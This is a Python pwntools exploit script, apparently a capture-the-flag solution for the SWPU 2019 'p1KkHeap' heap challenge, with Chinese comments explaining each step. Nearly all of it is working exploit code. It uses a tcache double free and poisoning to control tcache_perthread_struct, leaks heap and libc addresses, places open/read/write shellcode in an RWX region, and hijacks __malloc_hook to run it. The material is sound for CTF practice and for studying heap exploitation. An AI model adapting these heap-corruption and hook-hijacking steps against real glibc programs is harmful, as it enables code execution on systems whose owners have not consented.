"""
[SWPU 2019]p1kkheap

Date: 2026-09-06
Author: storm1614.top

shellcode，tcache poisoning，tcache_perthread_struct 
"""

from pwn import *

io = process("./SWPUCTF_2019_p1KkHeap")
#io = remote("node5.anna.nssctf.cn", 20666)
libc = ELF("./libc.so.6")

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"


def select(id: int):
    io.recvuntil(b"Your Choice: ")
    io.sendline(str(id).encode())


def add(size: int):
    select(1)
    io.recvuntil(b"size: ")
    io.sendline(str(size).encode())
    print("add ", hex(size))


def show(id: int):
    select(2)
    io.recvuntil(b"id: ")
    io.sendline(str(id).encode())
    print("show ", id)


def edit(id: int, content: bytes):
    select(3)
    io.recvuntil(b"id: ")
    io.sendline(str(id).encode())
    io.recvuntil(b"content: ")
    io.send(content)
    print("edit ", id)


def free(id: int):
    select(4)
    io.recvuntil(b"id: ")
    io.sendline(str(id).encode())
    print("free ", id)


def _debug():
    gdb.attach(
        io,
        gdbscript="""
            decompiler connect ida
               """,
    )


"""
mmap(addr: (void *)0x66660000, len: 0x1000u, prot: 7, flags: 34, fd: -1, offset: 0)

glibc 2.27 最新有加保护，得用旧版本

tcache poisoning 泄漏 tcache_perthread_struct 地址，然后把 0x110 堆的地址改掉，让接下来 add 进入这个地址
这样往内存空间写 shellcode

此时 0x110 count = -1，因为无符号数，就接下来 free 进 unsorted bins 这样泄漏 libc
获得 libc 之后再修改 prethread 的 0x110 地址为 malloc_hook 来劫持 malloc 到 shellcode 位置
"""

rwx_mem = 0x66660000

add(0x100)  # 0
add(0x100)  # 1
free(1)
free(1)
show(1)

tcache_perthread_struct = u64(io.recvuntil(b"\x55")[-6:].ljust(8, b"\x00")) - 0x360
print("hex address =", hex(tcache_perthread_struct))

add(0x100)  # 2
edit(2, p64(tcache_perthread_struct) * 2)

add(0x100)  # 3
add(0x100)  # 4
# 0x110 tcache count = -1

"""
offset(entries[15])
  = 0x40 + 15 * 8
  = 0xb8
"""
edit(4, b"\x00" * 0xB8 + p64(rwx_mem))

add(0x100)  # 5

shellcode = shellcraft.open('flag', 0)
shellcode += shellcraft.read(3, rwx_mem + 0x300, 0x50)
shellcode += shellcraft.write(1, rwx_mem + 0x300, 0x50)

edit(5, asm(shellcode)) # 写 0x66660000


free(0)

show(0)

"""
因为 -1 无符号为 0xff..ff 所以进 unsorted bins
"""
libc_base = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - 0x3ebca0
print("libc base address =", hex(libc_base))

malloc_hook = libc_base + libc.sym["__malloc_hook"]

edit(4, 0xb8 * b"\x00" + p64(malloc_hook)) # 劫持 malloc_hook

_debug()

add(0x100) # 6
edit(6, p64(rwx_mem))
add(100)
io.interactive()
